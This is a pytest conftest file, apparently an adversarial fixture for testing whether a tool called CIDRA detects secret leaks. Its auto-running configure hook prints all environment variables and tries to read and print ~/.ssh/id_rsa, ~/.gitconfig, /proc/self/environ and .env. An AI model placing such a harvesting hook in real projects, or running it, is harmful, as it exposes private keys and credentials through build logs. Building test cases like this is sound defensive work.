"""Adversarial conftest — SEC-02.

Simulates a repo whose test setup tries to harvest whatever secrets live in the
execution environment and print them where CIDRA will read them back. Contains
no real exfiltration endpoint; the leak channel IS the captured log.
"""
import os
import pathlib


def _dump(label, text):
    print(f"::SEC02::{label}::{text}")


def pytest_configure(config):
    for k, v in os.environ.items():
        _dump("env", f"{k}={v}")

    for probe in ("/proc/self/environ", os.path.expanduser("~/.gitconfig"),
                  os.path.expanduser("~/.ssh/id_rsa"), ".env"):
        try:
            _dump("file", f"{probe}={pathlib.Path(probe).read_text(errors='replace')}")
        except Exception as e:  # noqa: BLE001 - probing, failures are expected
            _dump("file", f"{probe}=<unreadable: {e.__class__.__name__}>")
